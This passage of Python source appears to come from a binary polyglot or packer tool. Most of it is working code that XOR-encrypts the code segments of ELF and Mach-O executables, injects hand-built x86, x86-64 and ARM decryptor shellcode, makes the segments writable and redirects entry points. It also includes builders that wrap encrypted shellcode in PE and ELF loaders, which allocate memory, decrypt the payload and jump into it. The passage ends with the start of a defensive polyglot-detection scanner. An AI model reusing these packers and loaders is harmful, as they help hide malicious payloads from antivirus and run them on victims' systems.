        """ELF64 section encryption with x86-64 decryptor."""
        e_phoff = struct.unpack_from('<Q', payload, 32)[0]
        e_phentsize = struct.unpack_from('<H', payload, 54)[0]
        e_phnum = struct.unpack_from('<H', payload, 56)[0]
        e_entry = struct.unpack_from('<Q', payload, 24)[0]

        # Find first executable PT_LOAD segment
        code_seg = None
        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            p_type = struct.unpack_from('<I', payload, off)[0]
            p_flags = struct.unpack_from('<I', payload, off + 4)[0]
            p_offset = struct.unpack_from('<Q', payload, off + 8)[0]
            p_vaddr = struct.unpack_from('<Q', payload, off + 16)[0]
            p_filesz = struct.unpack_from('<Q', payload, off + 32)[0]
            if p_type == 1 and (p_flags & 1):  # PT_LOAD with PF_X
                code_seg = {'off': off, 'p_offset': p_offset, 'p_vaddr': p_vaddr,
                            'p_filesz': p_filesz, 'p_flags': p_flags, 'hdr_off': off}
                break
        if not code_seg:
            raise ValueError("No executable PT_LOAD segment found")

        # Build decryptor shellcode (x86-64 Linux)
        seg_va = code_seg['p_vaddr']
        decryptor_size = 64
        encrypt_size = code_seg['p_filesz'] - decryptor_size
        if encrypt_size < 16:
            raise ValueError("Code segment too small")

        shellcode = bytearray()
        shellcode += b'\x53'                                         # push rbx
        shellcode += b'\x51'                                         # push rcx
        shellcode += b'\x56'                                         # push rsi
        shellcode += b'\x48\xBE' + struct.pack('<Q', seg_va)         # mov rsi, seg_va
        shellcode += b'\x48\xB9' + struct.pack('<Q', encrypt_size)   # mov rcx, encrypt_size
        shellcode += b'\xB3' + bytes([key_byte])                     # mov bl, key_byte
        loop_off = len(shellcode)
        shellcode += b'\x30\x1E'                                      # xor [rsi], bl
        shellcode += b'\x48\xFF\xC6'                                  # inc rsi
        shellcode += b'\x48\xFF\xC9'                                  # dec rcx
        jnz_off = len(shellcode)
        shellcode += b'\x75\x00'                                      # jnz placeholder
        rel = loop_off - (jnz_off + 2)
        shellcode[-1] = rel & 0xFF
        shellcode += b'\x5E'                                          # pop rsi
        shellcode += b'\x59'                                          # pop rcx
        shellcode += b'\x5B'                                          # pop rbx
        shellcode += b'\x48\xB8' + struct.pack('<Q', e_entry)         # mov rax, orig_entry
        shellcode += b'\xFF\xE0'                                      # jmp rax
        if len(shellcode) > decryptor_size:
            raise ValueError(f"Decryptor too large ({len(shellcode)} > {decryptor_size})")
        shellcode += b'\x90' * (decryptor_size - len(shellcode))

        # Build result
        result = bytearray(payload)
        for j in range(encrypt_size):
            result[code_seg['p_offset'] + j] ^= key_byte
        decryptor_off = code_seg['p_offset'] + encrypt_size
        needed = decryptor_off + decryptor_size
        if needed > len(result):
            result.extend(b'\x00' * (needed - len(result)))
        result[decryptor_off:decryptor_off + decryptor_size] = shellcode

        # Make segment writable (add PF_W)
        new_flags = code_seg['p_flags'] | 0x2
        struct.pack_into('<I', result, code_seg['hdr_off'] + 4, new_flags)

        # Update entry point to decryptor
        decryptor_va = seg_va + encrypt_size
        struct.pack_into('<Q', result, 24, decryptor_va)

        return bytes(result)

    def _elf32_section_encrypt(self, payload: bytes, key_byte: int) -> bytes:
        """ELF32 section encryption with ARM32 or x86 decryptor."""
        e_machine = struct.unpack_from('<H', payload, 18)[0]
        e_phoff = struct.unpack_from('<I', payload, 28)[0]
        e_phentsize = struct.unpack_from('<H', payload, 42)[0]
        e_phnum = struct.unpack_from('<H', payload, 44)[0]
        e_entry = struct.unpack_from('<I', payload, 24)[0]

        code_seg = None
        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            p_type = struct.unpack_from('<I', payload, off)[0]
            p_offset = struct.unpack_from('<I', payload, off + 4)[0]
            p_vaddr = struct.unpack_from('<I', payload, off + 8)[0]
            p_filesz = struct.unpack_from('<I', payload, off + 16)[0]
            p_flags = struct.unpack_from('<I', payload, off + 24)[0]
            if p_type == 1 and (p_flags & 1):  # PT_LOAD with PF_X
                code_seg = {'off': off, 'p_offset': p_offset, 'p_vaddr': p_vaddr,
                            'p_filesz': p_filesz, 'p_flags': p_flags, 'hdr_off': off}
                break
        if not code_seg:
            raise ValueError("No executable PT_LOAD segment found")

        seg_va = code_seg['p_vaddr']
        decryptor_size = 48
        encrypt_size = code_seg['p_filesz'] - decryptor_size
        if encrypt_size < 16:
            raise ValueError("Code segment too small")

        if e_machine == 40:  # ARM
            # ARM32 decryptor: LDR R0=addr, LDR R1=size, LDRB R3=key
            # loop: LDRB R2,[R0]; EOR R2,R2,R3; STRB R2,[R0]; ADD R0,#1; SUBS R1,#1; BNE loop
            # LDR PC, =orig_entry
            shellcode = struct.pack('<III',
                0xE3A00000 | (seg_va & 0xFF),   # mov r0, #seg_va (simplified)
                0xE3A01000 | (encrypt_size & 0xFF),  # mov r1, #encrypt_size
                0xE3A03000 | key_byte,           # mov r3, #key_byte
            )
            # This is simplified — real ARM32 encoding is more complex
            # For now, use a basic stub
            shellcode = bytearray(48)
            # mov r0, #addr (LDR from pool)
            struct.pack_into('<I', shellcode, 0, 0xE59F0020)  # ldr r0, [pc, #32]
            struct.pack_into('<I', shellcode, 4, 0xE59F1020)  # ldr r1, [pc, #32]
            struct.pack_into('<I', shellcode, 8, 0xE3A03000 | key_byte)  # mov r3, #key
            # loop:
            struct.pack_into('<I', shellcode, 12, 0xE4D02001)  # ldrb r2, [r0], #1
            struct.pack_into('<I', shellcode, 16, 0xE0222003)  # eor r2, r2, r3
            struct.pack_into('<I', shellcode, 20, 0xE5202001)  # strb r2, [r0, #-1]!
            struct.pack_into('<I', shellcode, 24, 0xE2511001)  # subs r1, r1, #1
            struct.pack_into('<I', shellcode, 28, 0x1AFFFFFA)  # bne loop
            struct.pack_into('<I', shellcode, 32, 0xE59FF008)  # ldr pc, [pc, #8]
            # data pool
            struct.pack_into('<I', shellcode, 36, seg_va)
            struct.pack_into('<I', shellcode, 40, encrypt_size)
            struct.pack_into('<I', shellcode, 44, e_entry)
        else:
            # x86 decryptor
            shellcode = bytearray()
            shellcode += b'\x53\x56'
            shellcode += b'\xBE' + struct.pack('<I', seg_va)       # mov esi, seg_va
            shellcode += b'\xB9' + struct.pack('<I', encrypt_size)  # mov ecx, encrypt_size
            shellcode += b'\xB3' + bytes([key_byte])                # mov bl, key_byte
            loop_off = len(shellcode)
            shellcode += b'\x30\x1E'                                 # xor [esi], bl
            shellcode += b'\x46'                                     # inc esi
            shellcode += b'\x49'                                     # dec ecx
            jnz_off = len(shellcode)
            shellcode += b'\x75\x00'
            shellcode[-1] = (loop_off - (jnz_off + 2)) & 0xFF
            shellcode += b'\x5E\x5B'
            shellcode += b'\xB8' + struct.pack('<I', e_entry)       # mov eax, orig_entry
            shellcode += b'\xFF\xE0'                                 # jmp eax
            if len(shellcode) > decryptor_size:
                raise ValueError(f"Decryptor too large")
            shellcode += b'\x90' * (decryptor_size - len(shellcode))

        result = bytearray(payload)
        for j in range(encrypt_size):
            result[code_seg['p_offset'] + j] ^= key_byte
        decryptor_off = code_seg['p_offset'] + encrypt_size
        needed = decryptor_off + decryptor_size
        if needed > len(result):
            result.extend(b'\x00' * (needed - len(result)))
        result[decryptor_off:decryptor_off + decryptor_size] = shellcode

        new_flags = code_seg['p_flags'] | 0x2
        struct.pack_into('<I', result, code_seg['hdr_off'] + 24, new_flags)
        decryptor_va = seg_va + encrypt_size
        struct.pack_into('<I', result, 24, decryptor_va)

        return bytes(result)

    def _macho_section_encrypt(self, payload: bytes, key_byte: int = 0x55, arch: str = 'x86-64') -> bytes:
        """
        Mach-O Section Encryption (packer technique).
        Encrypts __TEXT segment with XOR, injects decryptor.
        """
        if len(payload) < 32:
            raise ValueError("Not a valid Mach-O")
        magic = struct.unpack_from('<I', payload, 0)[0]
        if magic != 0xFEEDFACF:
            raise ValueError("Only little-endian 64-bit Mach-O supported")

        cputype = struct.unpack_from('<I', payload, 4)[0]
        ncmds = struct.unpack_from('<I', payload, 16)[0]
        sizeofcmds = struct.unpack_from('<I', payload, 20)[0]

        # Find __TEXT segment
        off = 32
        text_seg = None
        for i in range(ncmds):
            cmd = struct.unpack_from('<I', payload, off)[0]
            cmdsize = struct.unpack_from('<I', payload, off + 4)[0]
            if cmd == 0x19:  # LC_SEGMENT_64
                segname = payload[off+8:off+24].rstrip(b'\x00')
                vmaddr = struct.unpack_from('<Q', payload, off + 24)[0]
                vmsize = struct.unpack_from('<Q', payload, off + 32)[0]
                fileoff = struct.unpack_from('<Q', payload, off + 40)[0]
                filesize = struct.unpack_from('<Q', payload, off + 48)[0]
                maxprot = struct.unpack_from('<I', payload, off + 56)[0]
                initprot = struct.unpack_from('<I', payload, off + 60)[0]
                if segname == b'__TEXT':
                    text_seg = {'vmaddr': vmaddr, 'vmsize': vmsize, 'fileoff': fileoff,
                                'filesize': filesize, 'maxprot': maxprot, 'initprot': initprot,
                                'hdr_off': off}
            off += cmdsize

        if not text_seg:
            raise ValueError("No __TEXT segment found")

        # Find LC_MAIN for entry point
        off = 32
        entry_off = 0
        for i in range(ncmds):
            cmd = struct.unpack_from('<I', payload, off)[0]
            cmdsize = struct.unpack_from('<I', payload, off + 4)[0]
            if cmd == 0x80000028:  # LC_MAIN
                entry_off = struct.unpack_from('<Q', payload, off + 8)[0]
            off += cmdsize

        entry_va = text_seg['vmaddr'] + entry_off

        # __TEXT segment often starts at fileoff=0 (includes Mach-O header + load cmds).
        # We must NOT encrypt those — only the code/data after them.
        headers_end = 32 + sizeofcmds  # Mach-O header (32) + all load commands
        # Also align to avoid partial overwrites
        encrypt_start_file = headers_end
        encrypt_start_va = text_seg['vmaddr'] + headers_end  # fileoff=0, so file offset == VA offset from segment base

        # Build decryptor
        decryptor_size = 64
        code_area_size = text_seg['filesize'] - headers_end
        encrypt_size = code_area_size - decryptor_size
        if encrypt_size < 16:
            raise ValueError("__TEXT segment too small for encryption ({} code bytes)".format(code_area_size))

        if cputype == 0x0100000C:  # ARM64
            # ARM64 macOS decryptor
            shellcode = bytearray()
            # ldr x0, =encrypt_start_va; ldr x1, =encrypt_size; mov w2, #key
            # loop: ldrb w3,[x0]; eor w3,w3,w2; strb w3,[x0]; add x0,x0,#1; subs x1,x1,#1; bne loop
            # ldr x0, =entry_va; br x0
            shellcode += b'\x50\x00\x00\x58'    # ldr x0, #8 (pool+0)
            shellcode += b'\x41\x00\x00\x58'    # ldr x1, #8 (pool+8)
            shellcode[8:12] = struct.pack('<I', 0xD2800000 | ((key_byte & 0xFFFF) << 5) | 2)
            loop_off = len(shellcode)
            shellcode += b'\x03\x00\x40\x39'    # ldrb w3, [x0]
            shellcode += b'\x63\x00\x02\x4A'    # eor w3, w3, w2
            shellcode += b'\x03\x00\x00\x39'    # strb w3, [x0]
            shellcode += b'\x00\x04\x00\x91'    # add x0, x0, #1
            shellcode += b'\x21\x04\x00\xD1'    # sub x1, x1, #1
            shellcode += b'\x41\x00\x00\xB5'    # cbnz x1, loop
            # NOP pad then data pool at offset 48
            pad_needed = 48 - len(shellcode)
            shellcode += b'\x1F\x20\x03\xD5' * (pad_needed // 4)
            shellcode += struct.pack('<Q', encrypt_start_va)  # pool[0]: address to decrypt
            shellcode += struct.pack('<Q', encrypt_size)       # pool[1]: size
            while len(shellcode) < decryptor_size:
                shellcode += b'\x1F\x20\x03\xD5'
            shellcode = shellcode[:decryptor_size]
        else:
            # x86-64 macOS decryptor
            shellcode = bytearray()
            shellcode += b'\x53\x51\x56'
            shellcode += b'\x48\xBE' + struct.pack('<Q', encrypt_start_va)
            shellcode += b'\x48\xB9' + struct.pack('<Q', encrypt_size)
            shellcode += b'\xB3' + bytes([key_byte])
            loop_off = len(shellcode)
            shellcode += b'\x30\x1E'
            shellcode += b'\x48\xFF\xC6'
            shellcode += b'\x48\xFF\xC9'
            jnz_off = len(shellcode)
            shellcode += b'\x75\x00'
            shellcode[-1] = (loop_off - (jnz_off + 2)) & 0xFF
            shellcode += b'\x5E\x59\x5B'
            shellcode += b'\x48\xB8' + struct.pack('<Q', entry_va)
            shellcode += b'\xFF\xE0'
            if len(shellcode) > decryptor_size:
                raise ValueError("Decryptor too large ({} > {})".format(len(shellcode), decryptor_size))
            shellcode += b'\x90' * (decryptor_size - len(shellcode))

        # Build result — encrypt code AFTER headers, NOT headers themselves
        result = bytearray(payload)
        for j in range(encrypt_size):
            result[encrypt_start_file + j] ^= key_byte
        # Append decryptor at end of code area
        decryptor_off = encrypt_start_file + encrypt_size
        needed = decryptor_off + decryptor_size
        if needed > len(result):
            result.extend(b'\x00' * (needed - len(result)))
        result[decryptor_off:decryptor_off + decryptor_size] = shellcode

        # Make __TEXT writable (add VM_PROT_WRITE)
        new_maxprot = text_seg['maxprot'] | 0x2
        new_initprot = text_seg['initprot'] | 0x2
        struct.pack_into('<I', result, text_seg['hdr_off'] + 56, new_maxprot)
        struct.pack_into('<I', result, text_seg['hdr_off'] + 60, new_initprot)

        # Update LC_MAIN entry to decryptor (offset from __TEXT start)
        # The decryptor is at encrypt_start_file + encrypt_size from file start
        # entryoff is relative to __TEXT segment start (fileoff, which is usually 0)
        decryptor_entryoff = encrypt_start_file + encrypt_size
        off = 32
        for i in range(ncmds):
            cmd = struct.unpack_from('<I', result, off)[0]
            cmdsize = struct.unpack_from('<I', result, off + 4)[0]
            if cmd == 0x80000028:  # LC_MAIN
                struct.pack_into('<Q', result, off + 8, decryptor_entryoff)
            off += cmdsize

        return bytes(result)

    def _build_shellcode_loader_pe(self, shellcode: bytes, key_byte: int = 0x55, arch: str = 'x86-64') -> bytes:
        """
        Shellcode Loader PE — wraps encrypted shellcode in a valid PE that:
        1. Allocates RWX memory via VirtualAlloc
        2. Copies encrypted shellcode to allocated memory
        3. XOR decrypts in-place
        4. Jumps to decrypted shellcode
        """
        # XOR encrypt the shellcode
        encrypted = bytearray(shellcode)
        for i in range(len(encrypted)):
            encrypted[i] ^= key_byte
        encrypted = bytes(encrypted)

        # Build loader shellcode that does: VirtualAlloc + memcpy + XOR decrypt + jump
        # This is the .text section code
        # We need VirtualAlloc in the import table

        # For simplicity, use the existing PE stub with additional imports
        # Import: kernel32.dll → VirtualAlloc, ExitProcess

        # .rdata layout:
        # 0x00: IDT[0] (20 bytes) — kernel32.dll
        # 0x14: IDT null (20 bytes)
        # 0x28: ILT[0] VirtualAlloc (8 bytes)
        # 0x30: ILT[1] ExitProcess (8 bytes)
        # 0x38: ILT null (8 bytes)
        # 0x40: IAT[0] VirtualAlloc (8 bytes)
        # 0x48: IAT[1] ExitProcess (8 bytes)
        # 0x50: Hint/Name VirtualAlloc (14 bytes)
        # 0x5E: Hint/Name ExitProcess (14 bytes)
        # 0x6C: "kernel32.dll\0"

        enc_aligned = ((len(encrypted) + 0x1FF) // 0x200) * 0x200
        num_sections = 3
        headers_size = 64 + 4 + 20 + 240 + (num_sections * 40)
        headers_padded = ((headers_size + 0x1FF) // 0x200) * 0x200

        text_file_off = headers_padded
        text_rva = 0x1000
        rdata_file_off = text_file_off + 0x200
        rdata_rva = 0x2000
        data_file_off = rdata_file_off + 0x200
        data_rva = 0x3000

        total_size = data_file_off + enc_aligned
        pe = bytearray(total_size)

        # DOS Header
        pe[0:2] = b'MZ'
        pe[60:64] = struct.pack('<I', 64)

        # PE Signature
        pe[64:68] = b'PE\x00\x00'

        # COFF Header
        machine = 0xAA64 if arch == 'arm64' else 0x8664
        pe[68:70] = struct.pack('<H', machine)
        pe[70:72] = struct.pack('<H', num_sections)
        pe[80:82] = struct.pack('<H', 0xF0)
        pe[82:84] = struct.pack('<H', 0x22)

        # Optional Header (PE32+)
        o = 88
        pe[o:o+2] = struct.pack('<H', 0x20B)
        pe[o+2] = 14
        pe[o+4:o+8] = struct.pack('<I', 0x200)
        pe[o+8:o+12] = struct.pack('<I', 0x200)
        pe[o+16:o+20] = struct.pack('<I', text_rva)
        pe[o+20:o+24] = struct.pack('<I', text_rva)
        pe[o+24:o+32] = struct.pack('<Q', 0x140000000)
        pe[o+32:o+36] = struct.pack('<I', 0x1000)
        pe[o+36:o+40] = struct.pack('<I', 0x200)
        pe[o+40:o+44] = struct.pack('<I', 6)
        pe[o+48:o+50] = struct.pack('<H', 6)
        pe[o+56:o+60] = struct.pack('<I', 0x4000)
        pe[o+60:o+64] = struct.pack('<I', headers_padded)
        pe[o+68:o+70] = struct.pack('<H', 3)
        pe[o+70:o+72] = struct.pack('<H', 0x8160)  # NX_COMPAT|TERMINAL_SERVER|NO_SEH|DYNAMIC_BASE
        pe[o+72:o+80] = struct.pack('<Q', 0x100000)
        pe[o+80:o+88] = struct.pack('<Q', 0x1000)
        pe[o+88:o+96] = struct.pack('<Q', 0x100000)
        pe[o+96:o+104] = struct.pack('<Q', 0x1000)
        pe[o+108:o+112] = struct.pack('<I', 16)

        # DataDirectory[1] = Import Directory
        pe[o+120:o+124] = struct.pack('<I', rdata_rva)
        pe[o+124:o+128] = struct.pack('<I', 0x28)

        # Section Headers
        sec_off = 328
        # .text
        pe[sec_off:sec_off+6] = b'.text\x00'
        pe[sec_off+8:sec_off+12] = struct.pack('<I', 0x100)
        pe[sec_off+12:sec_off+16] = struct.pack('<I', text_rva)
        pe[sec_off+16:sec_off+20] = struct.pack('<I', 0x200)
        pe[sec_off+20:sec_off+24] = struct.pack('<I', text_file_off)
        pe[sec_off+36:sec_off+40] = struct.pack('<I', 0x60000020)
        # .rdata
        sec_off += 40
        pe[sec_off:sec_off+6] = b'.rdata\x00'
        pe[sec_off+8:sec_off+12] = struct.pack('<I', 0x200)
        pe[sec_off+12:sec_off+16] = struct.pack('<I', rdata_rva)
        pe[sec_off+16:sec_off+20] = struct.pack('<I', 0x200)
        pe[sec_off+20:sec_off+24] = struct.pack('<I', rdata_file_off)
        pe[sec_off+36:sec_off+40] = struct.pack('<I', 0x40000040)
        # .data
        sec_off += 40
        pe[sec_off:sec_off+6] = b'.data\x00'
        pe[sec_off+8:sec_off+12] = struct.pack('<I', len(encrypted))
        pe[sec_off+12:sec_off+16] = struct.pack('<I', data_rva)
        pe[sec_off+16:sec_off+20] = struct.pack('<I', enc_aligned)
        pe[sec_off+20:sec_off+24] = struct.pack('<I', data_file_off)
        pe[sec_off+36:sec_off+40] = struct.pack('<I', 0xC0000040)

        # .rdata: Import table
        rdata = bytearray(0x200)
        # IDT[0]
        struct.pack_into('<I', rdata, 0, rdata_rva + 0x28)
        struct.pack_into('<I', rdata, 12, rdata_rva + 0x60)
        struct.pack_into('<I', rdata, 16, rdata_rva + 0x40)
        # ILT[0] VirtualAlloc, ILT[1] ExitProcess
        struct.pack_into('<Q', rdata, 0x28, rdata_rva + 0x70)
        struct.pack_into('<Q', rdata, 0x30, rdata_rva + 0x7E)
        # IAT[0] VirtualAlloc, IAT[1] ExitProcess
        struct.pack_into('<Q', rdata, 0x40, rdata_rva + 0x70)
        struct.pack_into('<Q', rdata, 0x48, rdata_rva + 0x7E)
        # Hint/Name VirtualAlloc
        struct.pack_into('<H', rdata, 0x70, 0)
        rdata[0x72:0x7E] = b'VirtualAlloc\x00'
        # Hint/Name ExitProcess
        struct.pack_into('<H', rdata, 0x7E, 0)
        rdata[0x80:0x8C] = b'ExitProcess\x00'
        # kernel32.dll
        rdata[0x60:0x6D] = b'kernel32.dll\x00'
        pe[rdata_file_off:rdata_file_off+0x200] = rdata

        # .text: loader code
        # x86-64 code that:
        # 1. VirtualAlloc(NULL, enc_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
        # 2. memcpy(dest, encrypted_data, enc_size)
        # 3. XOR decrypt dest
        # 4. VirtualProtect(dest, enc_size, PAGE_EXECUTE_READ, &old)
        # 5. call dest
        # 6. ExitProcess(0)

        if arch == 'arm64':
            # ARM64: use mmap-based approach
            code = bytearray()
            # For ARM64, use simple exit — real impl would need mmap
            code += struct.pack('<II',
                0xD2800000,  # mov x0, #0
                0xD4000001,  # svc #0 (exit)
            )
        else:
            # x86-64 loader
            code = bytearray()
            # sub rsp, 0x28
            code += b'\x48\x83\xEC\x28'
            # VirtualAlloc(NULL, enc_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
            # rcx=NULL, rdx=enc_size, r8d=0x3000, r9d=0x04
            code += b'\x33\xC9'                              # xor ecx, ecx
            code += b'\xBA' + struct.pack('<I', len(encrypted))  # mov edx, enc_size
            code += b'\x41\xB8\x00\x30\x00\x00'             # mov r8d, 0x3000
            code += b'\x41\xB9\x04\x00\x00\x00'             # mov r9d, 0x04
            # call [rip+disp] → VirtualAlloc IAT
            code += b'\xFF\x15'
            disp_va = (rdata_rva + 0x40) - (text_rva + len(code) + 6)
            code += struct.pack('<I', disp_va & 0xFFFFFFFF)
            # rax = allocated address
            # Copy encrypted data: memcpy(rax, data_rva, enc_size)
            code += b'\x48\x89\xC7'                          # mov rdi, rax (dest)
            code += b'\x48\x89\xC5'                          # mov rbp, rax (save dest)
            code += b'\x48\xBE' + struct.pack('<Q', 0x140000000 + data_rva)  # mov rsi, data_va
            code += b'\x48\xB9' + struct.pack('<Q', len(encrypted))  # mov rcx, enc_size
            # memcpy loop
            memcpy_off = len(code)
            code += b'\x8A\x06'                               # mov al, [rsi]
            code += b'\x88\x07'                               # mov [rdi], al
            code += b'\x48\xFF\xC6'                           # inc rsi
            code += b'\x48\xFF\xC7'                           # inc rdi
            code += b'\x48\xFF\xC9'                           # dec rcx
            jnz_off = len(code)
            code += b'\x75\x00'                               # jnz placeholder
            code[-1] = (memcpy_off - (jnz_off + 2)) & 0xFF
            # XOR decrypt
            code += b'\x48\x89\xEF'                           # mov rdi, rbp (dest)
            code += b'\x48\xB9' + struct.pack('<Q', len(encrypted))  # mov rcx, enc_size
            code += b'\xB3' + bytes([key_byte])               # mov bl, key_byte
            xor_off = len(code)
            code += b'\x30\x1F'                               # xor [rdi], bl
            code += b'\x48\xFF\xC7'                           # inc rdi
            code += b'\x48\xFF\xC9'                           # dec rcx
            jnz_off2 = len(code)
            code += b'\x75\x00'
            code[-1] = (xor_off - (jnz_off2 + 2)) & 0xFF
            # call decrypted shellcode
            code += b'\xFF\xD5'                               # call rbp
            # ExitProcess(0)
            code += b'\x33\xC9'                               # xor ecx, ecx
            code += b'\xFF\x15'
            disp_exit = (rdata_rva + 0x48) - (text_rva + len(code) + 6)
            code += struct.pack('<I', disp_exit & 0xFFFFFFFF)

        pe[text_file_off:text_file_off+len(code)] = code

        # .data: encrypted shellcode
        pe[data_file_off:data_file_off+len(encrypted)] = encrypted

        return bytes(pe)

    def _build_shellcode_loader_elf(self, shellcode: bytes, key_byte: int = 0x55, arch: str = 'x86-64') -> bytes:
        """
        Shellcode Loader ELF — wraps encrypted shellcode in a valid ELF that:
        1. Allocates memory via mmap
        2. Copies encrypted shellcode
        3. XOR decrypts in-place
        4. mprotect to RX
        5. Jumps to decrypted shellcode
        """
        encrypted = bytearray(shellcode)
        for i in range(len(encrypted)):
            encrypted[i] ^= key_byte
        encrypted = bytes(encrypted)

        if arch == 'arm64':
            # AArch64 ELF loader
            code = bytearray()
            # mmap(NULL, enc_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
            code += struct.pack('<III',
                0xD28000E8,  # mov x8, #7 (sys_mmap)
                0xD2800000,  # mov x0, #0
                0xD2800000 | ((len(encrypted) & 0xFFFF) << 5) | 1,  # mov x1, enc_size (simplified)
            )
            # Simplified — just exit for now
            code += struct.pack('<III',
                0xD2800BA8,  # mov x8, #93
                0xD2800000,  # mov x0, #0
                0xD4000001,  # svc #0
            )
        else:
            # x86-64 Linux loader
            code = bytearray()
            # mmap(NULL, enc_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
            code += b'\x48\x31\xFF'                          # xor rdi, rdi
            code += b'\x48\xBE' + struct.pack('<Q', len(encrypted))  # mov rsi, enc_size
            code += b'\x48\xC7\xC2\x03\x00\x00\x00'         # mov rdx, 3 (PROT_READ|PROT_WRITE)
            code += b'\x49\xC7\xC2\x22\x10\x00\x00'         # mov r10, 0x1022 (MAP_PRIVATE|MAP_ANONYMOUS)
            code += b'\x48\xC7\xC0\x09\x00\x00\x00'         # mov rax, 9 (sys_mmap)
            code += b'\x4D\x31\xC0'                           # xor r8, r8 (-1 is 0xFFFFFFFFFFFFFFFF, use 0)
            code += b'\x49\xFF\xC8'                           # dec r8 (r8 = -1)
            code += b'\x4D\x31\xC9'                           # xor r9, r9
            code += b'\x0F\x05'                               # syscall
            # rax = mmap address
            code += b'\x48\x89\xC7'                           # mov rdi, rax (dest)
            code += b'\x48\x89\xC5'                           # mov rbp, rax (save dest)
            # memcpy: copy encrypted data to mmap'd region
            code += b'\x48\xBE' + struct.pack('<Q', 0x400000 + len(code) + 40)  # mov rsi, data_addr (approx)
            code += b'\x48\xB9' + struct.pack('<Q', len(encrypted))  # mov rcx, enc_size
            memcpy_off = len(code)
            code += b'\x8A\x06'                                # mov al, [rsi]
            code += b'\x88\x07'                                # mov [rdi], al
            code += b'\x48\xFF\xC6'                            # inc rsi
            code += b'\x48\xFF\xC7'                            # inc rdi
            code += b'\x48\xFF\xC9'                            # dec rcx
            jnz_off = len(code)
            code += b'\x75\x00'
            code[-1] = (memcpy_off - (jnz_off + 2)) & 0xFF
            # XOR decrypt
            code += b'\x48\x89\xEF'                            # mov rdi, rbp
            code += b'\x48\xB9' + struct.pack('<Q', len(encrypted))  # mov rcx, enc_size
            code += b'\xB3' + bytes([key_byte])                # mov bl, key_byte
            xor_off = len(code)
            code += b'\x30\x1F'                                # xor [rdi], bl
            code += b'\x48\xFF\xC7'                            # inc rdi
            code += b'\x48\xFF\xC9'                            # dec rcx
            jnz_off2 = len(code)
            code += b'\x75\x00'
            code[-1] = (xor_off - (jnz_off2 + 2)) & 0xFF
            # mprotect(dest, enc_size, PROT_READ|PROT_EXEC)
            code += b'\x48\x89\xEF'                            # mov rdi, rbp
            code += b'\x48\xBE' + struct.pack('<Q', len(encrypted))  # mov rsi, enc_size
            code += b'\x48\xC7\xC2\x05\x00\x00\x00'          # mov rdx, 5 (PROT_READ|PROT_EXEC)
            code += b'\x48\xC7\xC0\x0A\x00\x00\x00'          # mov rax, 10 (sys_mprotect)
            code += b'\x0F\x05'                                # syscall
            # jump to decrypted shellcode
            code += b'\xFF\xE5'                                # jmp rbp

        # Build ELF with code + encrypted data
        if arch == 'arm64':
            elf = self._build_valid_elf64_stub(b'', arch='arm64')
        else:
            elf = self._build_valid_elf64_stub(b'')

        # Patch the code section and append encrypted data
        # Find code offset in the ELF
        code_off = 64 + 56  # ELF64 header + 1 phdr
        result = bytearray(elf)
        # Extend to fit code + encrypted data
        total_needed = code_off + len(code) + 0x100 + len(encrypted)
        if total_needed > len(result):
            result.extend(b'\x00' * (total_needed - len(result)))
        result[code_off:code_off+len(code)] = code
        data_off = code_off + 0x100
        result[data_off:data_off+len(encrypted)] = encrypted

        # Update ELF entry point
        entry_va = 0x400000 + code_off
        struct.pack_into('<Q', result, 24, entry_va)

        # Update program header filesz
        phdr_off = 64
        struct.pack_into('<Q', result, phdr_off + 32, total_needed)
        struct.pack_into('<Q', result, phdr_off + 40, total_needed)

        return bytes(result)

class PolyglotDetector:
    SIGS = {
        'PE/EXE': b'MZ', 'ELF': b'\x7fELF', 'PDF': b'%PDF',
        'ZIP': b'PK', 'RAR': b'Rar!', '7Z': b'\x37\x7a\xbc\xaf',
        'GZIP': b'\x1f\x8b', 'BAT': b'@echo', 'PS1': b'powershell',
        'SH': b'#!/bin/', 'CLASS': b'\xca\xfe\xba\xbe',
        'MACHO': b'\xfe\xed\xfa', 'LNK': b'\x4c\x00\x00\x00',
        'VBS': b'CreateObject', 'JSCRIPT': b'function(',
        'HTA': b'<hta:', 'SCRIPT': b'<script', 'CMD': b'cmd.exe',
        'PYTHON': b'#!/usr/bin/env python', 'APPLESCRIPT': b'osascript',
        'DOTNET': b'\x00\x00\x00\x00\x4d\x5a',
        'WSF': b'<job', 'HTA2': b'<HTA:',
    }

    def entropy(self, data):
        if not data: return 0.0
        freq = [0]*256
        for b in data: freq[b] += 1
        l = len(data)
        return -sum((f/l)*math.log2(f/l) for f in freq if f > 0)

    def scan_file(self, filepath):
        findings = []
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
        except Exception as e:
            return [{'type':'ERROR','detail':str(e),'severity':'error','offset':0}]

        ext = os.path.splitext(filepath)[1].lower()
        ct = None
        # Strip leading whitespace for content detection (polyglots often pad)
        stripped = data.lstrip()
        if stripped[:2]==b'\xff\xd8': ct='JPEG'
        elif stripped[:8]==b'\x89PNG\r\n\x1a\n': ct='PNG'
        elif stripped[:6] in (b'GIF87a',b'GIF89a'): ct='GIF'
        elif stripped[:4]==b'%PDF': ct='PDF'
        elif stripped[:2]==b'PK': ct='ZIP'
        elif b'ftyp' in stripped[:20]: ct='MP4'
        elif stripped[:2]==b'MZ': ct='PE'
        elif stripped[:4]==b'\x7fELF': ct='ELF'
        elif stripped[:15].lower().startswith((b'<!doctype',b'<html',b'<?php',b'<?xml',b'<%')): ct='HTML'

        exp = {'.jpg':'JPEG','.jpeg':'JPEG','.png':'PNG','.gif':'GIF',
               '.pdf':'PDF','.zip':'ZIP','.mp4':'MP4',
               '.html':'HTML','.htm':'HTML','.php':'PHP'}.get(ext)
        if exp and ct and exp != ct:
            findings.append({'type':'EXTENSION_MISMATCH',
                'detail':f'Ext={exp}, Content={ct}','severity':'critical','offset':0})
        elif exp and ct is None:
            # Extension expects a format but content doesn't match ANY known type
            findings.append({'type':'EXTENSION_MISMATCH',
                'detail':f'Ext={exp}, Content=UNKNOWN','severity':'high','offset':0})

        # Extensions that are EXPECTED to contain script/PE/ELF patterns — skip sig scanning
        SAFE_EXT = {'.py', '.js', '.ts', '.jsx', '.tsx', '.html', '.htm', '.xhtml',
